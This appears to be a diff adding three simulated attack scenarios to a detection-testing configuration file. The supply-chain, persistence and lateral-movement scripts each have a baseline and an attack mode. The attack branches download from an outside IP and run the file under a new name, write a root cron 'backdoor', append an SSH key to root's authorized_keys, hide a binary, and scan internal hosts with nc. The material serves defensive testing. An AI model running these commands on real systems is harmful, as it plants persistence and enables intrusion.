@@ -136,3 +136,75 @@ data:
     fi
     wget -q -T 2 -O /dev/null http://10.96.0.1/registry/publish 2>/dev/null
     echo PUBLISHED
+  supply.sh: |
+    # S5 supply-chain:基线从内部镜像拉包;攻击外部下载 + 改名执行(下载执行链)
+    MODE="${1:-baseline}"
+    mkdir -p /workspace/pkg
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      wget -q -T 2 -O /tmp/tool.tar http://10.96.0.1/pkg/tool.tar 2>/dev/null
+      tar xzf /tmp/tool.tar -C /workspace/pkg 2>/dev/null
+      cat /workspace/pkg/tool 2>/dev/null
+      sh -c "ls /workspace/pkg" > /dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      wget -q -T 3 -O /tmp/evil http://203.0.113.9/evil 2>/dev/null
+      cp /bin/busybox /tmp/evil
+      sh -c "/tmp/evil true" 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /workspace/pkg/tool 2>/dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
+  persist.sh: |
+    # S6 persistence:基线写 workspace 状态;攻击 cron/SSH 密钥持久化 + 隐藏二进制
+    MODE="${1:-baseline}"
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      cat /etc/hosts > /dev/null
+      ls /var/log > /dev/null
+      echo ok > /workspace/status
+      wget -q -T 2 -O /dev/null http://10.96.0.1/healthz 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      echo "* * * * * root /tmp/x" > /etc/cron.d/backdoor 2>/dev/null
+      mkdir -p /root/.ssh
+      echo ssh-rsa AAAA-backdoor >> /root/.ssh/authorized_keys 2>/dev/null
+      cp /bin/busybox /workspace/.hidden
+      sh -c "/workspace/.hidden true" 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /etc/hosts > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
+  lateral.sh: |
+    # S7 lateral:基线内部健康检查;攻击 nc 扫描内部节点 22 端口 + 读路由表
+    MODE="${1:-baseline}"
+    N=30; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      wget -q -T 2 -O /dev/null http://10.96.0.1/healthz 2>/dev/null
+      cat /etc/hosts > /dev/null
+      ls /workspace > /dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      sh -c "nc -w 1 10.244.1.5 22 < /dev/null" 2>/dev/null
+      sh -c "nc -w 1 10.244.1.6 22 < /dev/null" 2>/dev/null
+      sh -c "nc -w 1 10.244.1.7 22 < /dev/null" 2>/dev/null
+      cat /proc/net/route 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /etc/hosts > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
